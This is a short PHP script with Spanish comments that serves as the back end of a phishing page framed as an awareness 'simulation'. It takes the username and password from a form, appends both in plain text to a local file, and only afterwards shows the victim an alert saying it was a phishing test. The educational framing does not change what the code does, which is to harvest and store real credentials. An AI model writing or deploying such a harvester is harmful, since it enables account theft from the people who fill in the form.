<?php
$archivo = fopen("datos.txt", "a");
$usuario = $_POST['usuario'];
$contrasena = $_POST['contrasena'];
fwrite($archivo, "Usuario: $usuario | Contraseña: $contrasena\n");
fclose($archivo);

// Mostrar mensaje educativo
echo "<script>alert('⚠️ ¡Esto era una prueba de phishing! Nunca pongas tus datos reales.');</script>";
echo "<h1 style='color:red;'>Simulación completada. ¡No caigas en páginas falsas!</h1>";
?>
